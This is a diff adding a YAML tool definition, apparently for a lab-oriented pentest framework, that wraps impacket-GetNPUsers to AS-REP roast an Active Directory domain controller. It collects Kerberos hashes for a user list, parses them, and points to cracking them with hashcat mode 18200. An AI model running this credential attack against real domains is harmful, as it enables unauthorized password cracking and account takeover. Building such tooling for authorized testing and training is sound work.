@@ -1,0 +1,51 @@
+id: impacket-GetNPUsers
+name: GetNPUsers (AS-REP roast)
+description: Get crackable AS-REP hashes for users without Kerberos pre-authentication
+category: windows-ad
+safety: exploit
+ports: [88]
+detect:
+  binary: impacket-GetNPUsers
+  apt: impacket-scripts
+  version_cmd: ["impacket-GetNPUsers", "-h"]
+  version_regex: 'Impacket v(\S+)'
+  help_cmd: ["impacket-GetNPUsers", "-h"]
+inputs:
+  domain:
+    from: domain
+    label: Domain
+    help: "AD domain, e.g. box.htb."
+  dc_ip:
+    from: target_ip
+    label: DC IP
+    help: "Domain controller (the box)."
+  users:
+    type: path
+    label: Users file
+    help: "Usernames to test, one per line, relative to the box folder (e.g. loot/users.txt from kerbrute, netexec or enum4linux-ng)."
+command:
+  - impacket-GetNPUsers
+  - "{domain}/"
+  - -no-pass
+  - -usersfile
+  - "{users}"
+  - -dc-ip
+  - "{dc_ip}"
+  - -format
+  - hashcat
+  - -outputfile
+  - "{out}/asrep.txt"
+  - "{extra}"
+timeout: 600
+outputs:
+  - path: "{out}/asrep.txt"
+parser: lines_regex
+parser_config:
+  patterns:
+    - regex: '^(?P<value>\$krb5asrep\$\d+\$(?P<user>[^@:]+)@\S+)$'
+      type: hash
+      set: { hashcat_mode: "18200", hash_types: ["Kerberos 5 AS-REP"] }
+      tags: [asrep]
+      confidence: 1.0
+notes: "Crack the hashes with hashcat -m 18200 (or john --format=krb5asrep)."
+learn: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
